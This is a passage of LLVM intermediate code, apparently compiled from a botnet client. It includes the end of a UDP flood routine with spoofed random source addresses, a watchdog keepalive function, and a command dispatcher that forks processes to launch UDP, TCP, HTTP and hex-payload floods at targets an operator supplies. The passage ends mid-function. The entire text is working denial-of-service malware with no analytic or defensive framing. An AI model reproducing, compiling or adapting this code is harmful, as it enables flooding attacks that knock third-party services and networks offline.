  %270 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 0
  %272 = bitcast %union.anon.2* %271 to %struct.anon.3*
  %273 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %272, i32 0, i32 1
  store i16 %269, i16* %273, align 2
  %274 = call i32 @rand_cmwc()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 3
  store i16 %275, i16* %277, align 4
  %278 = load i32, i32* %29, align 4
  %279 = call i32 @GetRandomIP(i32 %278)
  %280 = call i32 @htonl(i32 %279) #13
  %281 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %282 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %281, i32 0, i32 8
  store i32 %280, i32* %282, align 4
  %283 = bitcast i8* %156 to i16*
  %284 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 2
  %286 = load i16, i16* %285, align 2
  %287 = zext i16 %286 to i32
  %288 = call zeroext i16 @csum(i16* %283, i32 %287)
  %289 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 7
  store i16 %288, i16* %290, align 2
  %291 = load i32, i32* %34, align 4
  %292 = load i32, i32* %20, align 4
  %293 = icmp eq i32 %291, %292
  br i1 %293, label %294, label %300

; <label>:294:                                    ; preds = %267
  %295 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %296 = load i32, i32* %33, align 4
  %297 = icmp sgt i32 %295, %296
  br i1 %297, label %298, label %299

; <label>:298:                                    ; preds = %294
  br label %313

; <label>:299:                                    ; preds = %294
  store i32 0, i32* %34, align 4
  br label %243

; <label>:300:                                    ; preds = %267
  %301 = load i32, i32* %34, align 4
  %302 = add i32 %301, 1
  store i32 %302, i32* %34, align 4
  %303 = load i32, i32* %35, align 4
  %304 = load i32, i32* %15, align 4
  %305 = icmp eq i32 %303, %304
  br i1 %305, label %306, label %310

; <label>:306:                                    ; preds = %300
  %307 = load i32, i32* %16, align 4
  %308 = mul nsw i32 %307, 1000
  %309 = call i32 @usleep(i32 %308)
  store i32 0, i32* %35, align 4
  br label %243

; <label>:310:                                    ; preds = %300
  %311 = load i32, i32* %35, align 4
  %312 = add i32 %311, 1
  store i32 %312, i32* %35, align 4
  br label %243

; <label>:313:                                    ; preds = %298
  %314 = load i8*, i8** %30, align 8
  call void @llvm.stackrestore(i8* %314)
  br label %315

; <label>:315:                                    ; preds = %313, %130, %124, %119, %72, %64, %53
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @ioctl_keepalive() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = call i32 @fork() #2
  store i32 %4, i32* @ioctl_pid, align 4
  %5 = load i32, i32* @ioctl_pid, align 4
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %10, label %7

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @ioctl_pid, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %7, %0
  ret void

; <label>:11:                                     ; preds = %7
  store i32 1, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  %12 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.98, i32 0, i32 0), i32 2)
  store i32 %12, i32* %2, align 4
  %13 = icmp ne i32 %12, -1
  br i1 %13, label %20, label %14

; <label>:14:                                     ; preds = %11
  %15 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.99, i32 0, i32 0), i32 2)
  store i32 %15, i32* %2, align 4
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %14
  %18 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.100, i32 0, i32 0), i32 2)
  store i32 %18, i32* %2, align 4
  %19 = icmp ne i32 %18, -1
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %17, %14, %11
  store i32 0, i32* %3, align 4
  %21 = load i32, i32* %2, align 4
  %22 = call i32 (i32, i64, ...) @ioctl(i32 %21, i64 2147768068, i32* %1) #2
  br label %23

; <label>:23:                                     ; preds = %20, %17
  %24 = load i32, i32* %3, align 4
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %26, label %31

; <label>:26:                                     ; preds = %23
  br label %27

; <label>:27:                                     ; preds = %27, %26
  %28 = load i32, i32* %2, align 4
  %29 = call i32 (i32, i64, ...) @ioctl(i32 %28, i64 2147768069, i32 0) #2
  %30 = call i32 @sleep(i32 10)
  br label %27

; <label>:31:                                     ; preds = %23
  call void @exit(i32 0) #14
  unreachable
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i32, align 4
  %44 = alloca i32, align 4
  %45 = alloca i8*, align 8
  %46 = alloca i32, align 4
  %47 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %48 = load i8**, i8*** %4, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @strcmp(i8* %50, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i32 0, i32 0)) #10
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %196, label %53

; <label>:53:                                     ; preds = %2
  %54 = load i32, i32* %3, align 4
  %55 = icmp slt i32 %54, 6
  br i1 %55, label %107, label %56

; <label>:56:                                     ; preds = %53
  %57 = load i8**, i8*** %4, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @atoi(i8* %59) #10
  %61 = icmp eq i32 %60, -1
  br i1 %61, label %107, label %62

; <label>:62:                                     ; preds = %56
  %63 = load i8**, i8*** %4, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 2
  %65 = load i8*, i8** %64, align 8
  %66 = call i32 @atoi(i8* %65) #10
  %67 = icmp eq i32 %66, -1
  br i1 %67, label %107, label %68

; <label>:68:                                     ; preds = %62
  %69 = load i8**, i8*** %4, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 4
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 @atoi(i8* %71) #10
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %107, label %74

; <label>:74:                                     ; preds = %68
  %75 = load i8**, i8*** %4, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 5
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @atoi(i8* %77) #10
  %79 = icmp eq i32 %78, -1
  br i1 %79, label %107, label %80

; <label>:80:                                     ; preds = %74
  %81 = load i8**, i8*** %4, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 5
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83) #10
  %85 = icmp sgt i32 %84, 65536
  br i1 %85, label %107, label %86

; <label>:86:                                     ; preds = %80
  %87 = load i8**, i8*** %4, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 5
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 @atoi(i8* %89) #10
  %91 = icmp sgt i32 %90, 65500
  br i1 %91, label %107, label %92

; <label>:92:                                     ; preds = %86
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 4
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @atoi(i8* %95) #10
  %97 = icmp sgt i32 %96, 32
  br i1 %97, label %107, label %98

; <label>:98:                                     ; preds = %92
  %99 = load i32, i32* %3, align 4
  %100 = icmp eq i32 %99, 7
  br i1 %100, label %101, label %108

; <label>:101:                                    ; preds = %98
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 6
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @atoi(i8* %104) #10
  %106 = icmp slt i32 %105, 1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %101, %92, %86, %80, %74, %68, %62, %56, %53
  br label %751

; <label>:108:                                    ; preds = %101, %98
  %109 = load i8**, i8*** %4, align 8
  %110 = getelementptr inbounds i8*, i8** %109, i64 1
  %111 = load i8*, i8** %110, align 8
  store i8* %111, i8** %5, align 8
  %112 = load i8**, i8*** %4, align 8
  %113 = getelementptr inbounds i8*, i8** %112, i64 2
  %114 = load i8*, i8** %113, align 8
  %115 = call i32 @atoi(i8* %114) #10
  store i32 %115, i32* %6, align 4
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  store i32 %119, i32* %7, align 4
  %120 = load i8**, i8*** %4, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 4
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122) #10
  store i32 %123, i32* %8, align 4
  %124 = load i8**, i8*** %4, align 8
  %125 = getelementptr inbounds i8*, i8** %124, i64 5
  %126 = load i8*, i8** %125, align 8
  %127 = call i32 @atoi(i8* %126) #10
  store i32 %127, i32* %9, align 4
  %128 = load i32, i32* %3, align 4
  %129 = icmp sgt i32 %128, 6
  br i1 %129, label %130, label %135

; <label>:130:                                    ; preds = %108
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 6
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @atoi(i8* %133) #10
  br label %136

; <label>:135:                                    ; preds = %108
  br label %136

; <label>:136:                                    ; preds = %135, %130
  %137 = phi i32 [ %134, %130 ], [ 1000, %135 ]
  store i32 %137, i32* %10, align 4
  %138 = load i32, i32* %3, align 4
  %139 = icmp sgt i32 %138, 7
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %136
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 7
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #10
  br label %146

; <label>:145:                                    ; preds = %136
  br label %146

; <label>:146:                                    ; preds = %145, %140
  %147 = phi i32 [ %144, %140 ], [ 1000000, %145 ]
  store i32 %147, i32* %11, align 4
  %148 = load i32, i32* %3, align 4
  %149 = icmp sgt i32 %148, 8
  br i1 %149, label %150, label %155

; <label>:150:                                    ; preds = %146
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 8
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #10
  br label %156

; <label>:155:                                    ; preds = %146
  br label %156

; <label>:156:                                    ; preds = %155, %150
  %157 = phi i32 [ %154, %150 ], [ 0, %155 ]
  store i32 %157, i32* %12, align 4
  %158 = load i8*, i8** %5, align 8
  %159 = call i8* @strstr(i8* %158, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %160 = icmp ne i8* %159, null
  br i1 %160, label %161, label %182

; <label>:161:                                    ; preds = %156
  %162 = load i8*, i8** %5, align 8
  %163 = call i8* @strtok(i8* %162, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %163, i8** %13, align 8
  br label %164

; <label>:164:                                    ; preds = %179, %161
  %165 = load i8*, i8** %13, align 8
  %166 = icmp ne i8* %165, null
  br i1 %166, label %167, label %181

; <label>:167:                                    ; preds = %164
  %168 = call i32 @listFork()
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %179, label %170

; <label>:170:                                    ; preds = %167
  %171 = load i8*, i8** %13, align 8
  %172 = load i32, i32* %6, align 4
  %173 = load i32, i32* %7, align 4
  %174 = load i32, i32* %8, align 4
  %175 = load i32, i32* %9, align 4
  %176 = load i32, i32* %10, align 4
  %177 = load i32, i32* %11, align 4
  %178 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %171, i32 %172, i32 %173, i32 %174, i32 %175, i32 %176, i32 %177, i32 %178)
  call void @_exit(i32 0) #12
  unreachable

; <label>:179:                                    ; preds = %167
  %180 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %180, i8** %13, align 8
  br label %164

; <label>:181:                                    ; preds = %164
  br label %195

; <label>:182:                                    ; preds = %156
  %183 = call i32 @listFork()
  %184 = icmp ne i32 %183, 0
  br i1 %184, label %194, label %185

; <label>:185:                                    ; preds = %182
  %186 = load i8*, i8** %5, align 8
  %187 = load i32, i32* %6, align 4
  %188 = load i32, i32* %7, align 4
  %189 = load i32, i32* %8, align 4
  %190 = load i32, i32* %9, align 4
  %191 = load i32, i32* %10, align 4
  %192 = load i32, i32* %11, align 4
  %193 = load i32, i32* %12, align 4
  call void @sendUDP(i8* %186, i32 %187, i32 %188, i32 %189, i32 %190, i32 %191, i32 %192, i32 %193)
  call void @_exit(i32 0) #12
  unreachable

; <label>:194:                                    ; preds = %182
  br label %195

; <label>:195:                                    ; preds = %194, %181
  br label %751

; <label>:196:                                    ; preds = %2
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 0
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @strcmp(i8* %199, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #10
  %201 = icmp ne i32 %200, 0
  br i1 %201, label %323, label %202

; <label>:202:                                    ; preds = %196
  %203 = load i32, i32* %3, align 4
  %204 = icmp slt i32 %203, 6
  br i1 %204, label %247, label %205

; <label>:205:                                    ; preds = %202
  %206 = load i8**, i8*** %4, align 8
  %207 = getelementptr inbounds i8*, i8** %206, i64 3
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @atoi(i8* %208) #10
  %210 = icmp eq i32 %209, -1
  br i1 %210, label %247, label %211

; <label>:211:                                    ; preds = %205
  %212 = load i8**, i8*** %4, align 8
  %213 = getelementptr inbounds i8*, i8** %212, i64 2
  %214 = load i8*, i8** %213, align 8
  %215 = call i32 @atoi(i8* %214) #10
  %216 = icmp eq i32 %215, -1
  br i1 %216, label %247, label %217

; <label>:217:                                    ; preds = %211
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 4
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @atoi(i8* %220) #10
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %247, label %223

; <label>:223:                                    ; preds = %217
  %224 = load i8**, i8*** %4, align 8
  %225 = getelementptr inbounds i8*, i8** %224, i64 4
  %226 = load i8*, i8** %225, align 8
  %227 = call i32 @atoi(i8* %226) #10
  %228 = icmp sgt i32 %227, 32
  br i1 %228, label %247, label %229

; <label>:229:                                    ; preds = %223
  %230 = load i32, i32* %3, align 4
  %231 = icmp sgt i32 %230, 6
  br i1 %231, label %232, label %238

; <label>:232:                                    ; preds = %229
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 6
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @atoi(i8* %235) #10
  %237 = icmp slt i32 %236, 0
  br i1 %237, label %247, label %238

; <label>:238:                                    ; preds = %232, %229
  %239 = load i32, i32* %3, align 4
  %240 = icmp eq i32 %239, 8
  br i1 %240, label %241, label %248

; <label>:241:                                    ; preds = %238
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 7
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp slt i32 %245, 1
  br i1 %246, label %247, label %248

; <label>:247:                                    ; preds = %241, %232, %223, %217, %211, %205, %202
  br label %751

; <label>:248:                                    ; preds = %241, %238
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 1
  %251 = load i8*, i8** %250, align 8
  store i8* %251, i8** %14, align 8
  %252 = load i8**, i8*** %4, align 8
  %253 = getelementptr inbounds i8*, i8** %252, i64 2
  %254 = load i8*, i8** %253, align 8
  %255 = call i32 @atoi(i8* %254) #10
  store i32 %255, i32* %15, align 4
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 3
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #10
  store i32 %259, i32* %16, align 4
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 4
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  store i32 %263, i32* %17, align 4
  %264 = load i8**, i8*** %4, align 8
  %265 = getelementptr inbounds i8*, i8** %264, i64 5
  %266 = load i8*, i8** %265, align 8
  store i8* %266, i8** %18, align 8
  %267 = load i32, i32* %3, align 4
  %268 = icmp eq i32 %267, 8
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %248
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 7
  %272 = load i8*, i8** %271, align 8
  %273 = call i32 @atoi(i8* %272) #10
  br label %275

; <label>:274:                                    ; preds = %248
  br label %275

; <label>:275:                                    ; preds = %274, %269
  %276 = phi i32 [ %273, %269 ], [ 10, %274 ]
  store i32 %276, i32* %19, align 4
  %277 = load i32, i32* %3, align 4
  %278 = icmp sgt i32 %277, 6
  br i1 %278, label %279, label %284

; <label>:279:                                    ; preds = %275
  %280 = load i8**, i8*** %4, align 8
  %281 = getelementptr inbounds i8*, i8** %280, i64 6
  %282 = load i8*, i8** %281, align 8
  %283 = call i32 @atoi(i8* %282) #10
  br label %285

; <label>:284:                                    ; preds = %275
  br label %285

; <label>:285:                                    ; preds = %284, %279
  %286 = phi i32 [ %283, %279 ], [ 0, %284 ]
  store i32 %286, i32* %20, align 4
  %287 = load i8*, i8** %14, align 8
  %288 = call i8* @strstr(i8* %287, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %289 = icmp ne i8* %288, null
  br i1 %289, label %290, label %310

; <label>:290:                                    ; preds = %285
  %291 = load i8*, i8** %14, align 8
  %292 = call i8* @strtok(i8* %291, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %292, i8** %21, align 8
  br label %293

; <label>:293:                                    ; preds = %307, %290
  %294 = load i8*, i8** %21, align 8
  %295 = icmp ne i8* %294, null
  br i1 %295, label %296, label %309

; <label>:296:                                    ; preds = %293
  %297 = call i32 @listFork()
  %298 = icmp ne i32 %297, 0
  br i1 %298, label %307, label %299

; <label>:299:                                    ; preds = %296
  %300 = load i8*, i8** %21, align 8
  %301 = load i32, i32* %15, align 4
  %302 = load i32, i32* %16, align 4
  %303 = load i32, i32* %17, align 4
  %304 = load i8*, i8** %18, align 8
  %305 = load i32, i32* %20, align 4
  %306 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %300, i32 %301, i32 %302, i32 %303, i8* %304, i32 %305, i32 %306)
  call void @_exit(i32 0) #12
  unreachable

; <label>:307:                                    ; preds = %296
  %308 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %308, i8** %21, align 8
  br label %293

; <label>:309:                                    ; preds = %293
  br label %322

; <label>:310:                                    ; preds = %285
  %311 = call i32 @listFork()
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %310
  %314 = load i8*, i8** %14, align 8
  %315 = load i32, i32* %15, align 4
  %316 = load i32, i32* %16, align 4
  %317 = load i32, i32* %17, align 4
  %318 = load i8*, i8** %18, align 8
  %319 = load i32, i32* %20, align 4
  %320 = load i32, i32* %19, align 4
  call void @sendTCP(i8* %314, i32 %315, i32 %316, i32 %317, i8* %318, i32 %319, i32 %320)
  call void @_exit(i32 0) #12
  unreachable

; <label>:321:                                    ; preds = %310
  br label %322

; <label>:322:                                    ; preds = %321, %309
  br label %751

; <label>:323:                                    ; preds = %196
  %324 = load i8**, i8*** %4, align 8
  %325 = getelementptr inbounds i8*, i8** %324, i64 0
  %326 = load i8*, i8** %325, align 8
  %327 = call i32 @strcmp(i8* %326, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i32 0, i32 0)) #10
  %328 = icmp ne i32 %327, 0
  br i1 %328, label %377, label %329

; <label>:329:                                    ; preds = %323
  %330 = load i32, i32* %3, align 4
  %331 = icmp slt i32 %330, 4
  br i1 %331, label %344, label %332

; <label>:332:                                    ; preds = %329
  %333 = load i8**, i8*** %4, align 8
  %334 = getelementptr inbounds i8*, i8** %333, i64 2
  %335 = load i8*, i8** %334, align 8
  %336 = call i32 @atoi(i8* %335) #10
  %337 = icmp slt i32 %336, 1
  br i1 %337, label %344, label %338

; <label>:338:                                    ; preds = %332
  %339 = load i8**, i8*** %4, align 8
  %340 = getelementptr inbounds i8*, i8** %339, i64 3
  %341 = load i8*, i8** %340, align 8
  %342 = call i32 @atoi(i8* %341) #10
  %343 = icmp slt i32 %342, 1
  br i1 %343, label %344, label %345

; <label>:344:                                    ; preds = %338, %332, %329
  br label %751

; <label>:345:                                    ; preds = %338
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 1
  %348 = load i8*, i8** %347, align 8
  store i8* %348, i8** %22, align 8
  %349 = load i8**, i8*** %4, align 8
  %350 = getelementptr inbounds i8*, i8** %349, i64 2
  %351 = load i8*, i8** %350, align 8
  %352 = call i32 @atoi(i8* %351) #10
  store i32 %352, i32* %23, align 4
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 3
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @atoi(i8* %355) #10
  store i32 %356, i32* %24, align 4
  %357 = load i8*, i8** %22, align 8
  %358 = call i8* @strstr(i8* %357, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %359 = icmp ne i8* %358, null
  br i1 %359, label %360, label %372

; <label>:360:                                    ; preds = %345
  %361 = load i8*, i8** %22, align 8
  %362 = call i8* @strtok(i8* %361, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %362, i8** %25, align 8
  br label %363

; <label>:363:                                    ; preds = %366, %360
  %364 = load i8*, i8** %25, align 8
  %365 = icmp ne i8* %364, null
  br i1 %365, label %366, label %371

; <label>:366:                                    ; preds = %363
  %367 = load i8*, i8** %25, align 8
  %368 = load i32, i32* %23, align 4
  %369 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %367, i32 %368, i32 %369)
  %370 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %370, i8** %25, align 8
  br label %363

; <label>:371:                                    ; preds = %363
  br label %376

; <label>:372:                                    ; preds = %345
  %373 = load i8*, i8** %22, align 8
  %374 = load i32, i32* %23, align 4
  %375 = load i32, i32* %24, align 4
  call void @sendHTTP(i8* %373, i32 %374, i32 %375)
  br label %376

; <label>:376:                                    ; preds = %372, %371
  br label %751

; <label>:377:                                    ; preds = %323
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 0
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @strcmp(i8* %380, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i32 0, i32 0)) #10
  %382 = icmp ne i32 %381, 0
  br i1 %382, label %426, label %383

; <label>:383:                                    ; preds = %377
  %384 = load i32, i32* %3, align 4
  %385 = icmp slt i32 %384, 6
  br i1 %385, label %398, label %386

; <label>:386:                                    ; preds = %383
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 3
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #10
  %391 = icmp slt i32 %390, 1
  br i1 %391, label %398, label %392

; <label>:392:                                    ; preds = %386
  %393 = load i8**, i8*** %4, align 8
  %394 = getelementptr inbounds i8*, i8** %393, i64 5
  %395 = load i8*, i8** %394, align 8
  %396 = call i32 @atoi(i8* %395) #10
  %397 = icmp slt i32 %396, 1
  br i1 %397, label %398, label %399

; <label>:398:                                    ; preds = %392, %386, %383
  br label %751

; <label>:399:                                    ; preds = %392
  %400 = call i32 @listFork()
  %401 = icmp ne i32 %400, 0
  br i1 %401, label %402, label %403

; <label>:402:                                    ; preds = %399
  br label %751

; <label>:403:                                    ; preds = %399
  %404 = load i8**, i8*** %4, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 1
  %406 = load i8*, i8** %405, align 8
  %407 = load i8**, i8*** %4, align 8
  %408 = getelementptr inbounds i8*, i8** %407, i64 2
  %409 = load i8*, i8** %408, align 8
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 3
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @atoi(i8* %412) #10
  %414 = trunc i32 %413 to i16
  %415 = load i8**, i8*** %4, align 8
  %416 = getelementptr inbounds i8*, i8** %415, i64 4
  %417 = load i8*, i8** %416, align 8
  %418 = load i8**, i8*** %4, align 8
  %419 = getelementptr inbounds i8*, i8** %418, i64 5
  %420 = load i8*, i8** %419, align 8
  %421 = call i32 @atoi(i8* %420) #10
  %422 = load i8**, i8*** %4, align 8
  %423 = getelementptr inbounds i8*, i8** %422, i64 6
  %424 = load i8*, i8** %423, align 8
  %425 = call i32 @atoi(i8* %424) #10
  call void @sendHEX(i8* %406, i8* %409, i16 zeroext %414, i8* %417, i32 %421, i32 %425)
  call void @exit(i32 0) #14
  unreachable

; <label>:426:                                    ; preds = %377
  %427 = load i8**, i8*** %4, align 8
  %428 = getelementptr inbounds i8*, i8** %427, i64 0
  %429 = load i8*, i8** %428, align 8
  %430 = call i32 @strcmp(i8* %429, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %431 = icmp ne i32 %430, 0
  br i1 %431, label %480, label %432

; <label>:432:                                    ; preds = %426
  %433 = load i32, i32* %3, align 4
  %434 = icmp slt i32 %433, 4
  br i1 %434, label %447, label %435

; <label>:435:                                    ; preds = %432
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 2
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #10
  %440 = icmp slt i32 %439, 1
  br i1 %440, label %447, label %441

; <label>:441:                                    ; preds = %435
  %442 = load i8**, i8*** %4, align 8
  %443 = getelementptr inbounds i8*, i8** %442, i64 3
  %444 = load i8*, i8** %443, align 8
  %445 = call i32 @atoi(i8* %444) #10
  %446 = icmp slt i32 %445, 1
  br i1 %446, label %447, label %448

; <label>:447:                                    ; preds = %441, %435, %432
  br label %751

; <label>:448:                                    ; preds = %441
  %449 = load i8**, i8*** %4, align 8
  %450 = getelementptr inbounds i8*, i8** %449, i64 1
  %451 = load i8*, i8** %450, align 8
  store i8* %451, i8** %26, align 8
  %452 = load i8**, i8*** %4, align 8
  %453 = getelementptr inbounds i8*, i8** %452, i64 2
  %454 = load i8*, i8** %453, align 8
  %455 = call i32 @atoi(i8* %454) #10
  store i32 %455, i32* %27, align 4
  %456 = load i8**, i8*** %4, align 8
  %457 = getelementptr inbounds i8*, i8** %456, i64 3
  %458 = load i8*, i8** %457, align 8
  %459 = call i32 @atoi(i8* %458) #10
  store i32 %459, i32* %28, align 4
  %460 = load i8*, i8** %26, align 8
  %461 = call i8* @strstr(i8* %460, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %462 = icmp ne i8* %461, null
  br i1 %462, label %463, label %475

; <label>:463:                                    ; preds = %448
  %464 = load i8*, i8** %26, align 8
  %465 = call i8* @strtok(i8* %464, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %465, i8** %29, align 8
  br label %466

; <label>:466:                                    ; preds = %469, %463
